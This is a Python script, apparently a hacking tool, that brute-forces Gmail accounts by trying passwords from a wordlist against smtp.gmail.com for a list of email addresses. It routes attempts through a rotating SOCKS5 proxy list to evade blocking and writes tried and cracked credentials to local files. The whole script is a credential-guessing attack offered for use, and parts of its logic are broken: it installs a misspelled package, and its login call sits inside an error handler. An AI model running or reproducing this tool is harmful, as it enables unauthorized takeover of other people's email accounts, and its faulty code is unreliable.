
import smtplib
import socket
import os
import socket


from setup.banner import banner , banner2 , clear
from setup.colors import r,c,g,y,ran
from setup.sprint import sprint


try:
    import socks
except ModuleNotFoundError:
    os.system("pip install spcks")



clear()
banner()
yes = ["y" , "yes"]
no = ["n" , "no"]

try:
    em_choice = input(ran + "Enter path of email: "+g)
except FileNotFoundError:
    sprint(r + "File not found")
    exit(0)

try:
    pass_choice = input(y + "Do you want to use default wordlist? "+r+"(y/n) :"+g).lower()
    if pass_choice in yes:
        passlist = r"files/passwords.txt"
    else:
        passlist = input(c + "Enter path of worlist: "+g)
except FileNotFoundError:
    sprint(r + "File not found")
    exit(0)

try:
    prox_choice = input(ran + "Do you want to use default proxy list? " +c+ "(y/n): ").lower()
    if prox_choice in yes:
        proxy_list = r"files/HTTP.txt"
    else:
        proxy_list = input(ran + "Enter path of proxies: "+g)
except FileNotFoundError:
    sprint(r + "File not found")
    exit(0)



o_pass = r"files/passwords.txt"
o_tried = r"files/tried.txt"
o_found = r"files/found.txt"


passwords = [i.strip("\n") for i in open(passlist , "r").readlines()]
tried = [i.strip("\n") for i in open("files/tried.txt")]
found = [i.strip("\n") for i in open("files/found.txt" , "r").readlines()]
mails = [i.strip("\n") for i in open(em_choice , "r").readlines()]
ip = [i.strip("\n") for i in open("files/HTTP.txt" , "r").readlines()]
px = 0



def cracker():

    for m in mails:
        print(f"{y}Fetching mail {r}{str(m)}")
        for n , password in enumerate(passwords):
            tot_pass = str(len(passwords))
            print(f"{c}Trying password {r}{str(password)}: {g}{str(n)}/{y}{tot_pass}")
            print
            with open(o_tried , "a") as f:
                f.write(f"{m} -- {password}\n")
            try :

                    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
                    smtpserver.ehlo()
                    smtpserver.starttls()
            except smtplib.SMTPServerDisconnected:
                    print("/033[1;31mIt seems something is wrong.")

                    try :
                        with open(proxy_list , "r") as file:
                            proxies = file.readlines()
                        proxy = proxies[px].replace('\n','').split(":")
                        socket.socket = socks.socksocket
                        socks.set_default_proxy(socks.SOCKS5,proxy[0],proxy[1] )
                        smtpserver.login(m , password)
                        with open(o_found , "a") as fo:
                            fo.write(f"{m} {password}")
                        print(y +"Password Found:"+c + str(password))
                        with open(o_found , "a") as fo:
                            fo.write(f"{m} {password}")
                        smtpserver.close()
            
                        break
                    except smtplib.SMTPAuthenticationError:
                        print("failed")
                        continue
                    px += 1    
                      
                    
cont = ""
while cont not in no:
    cracker()
    ch = input(f"{ran}Continue? {y}(y/n): "+r).lower()

    if ch in no:
        clear
        banner2()

    else:
        banner2()



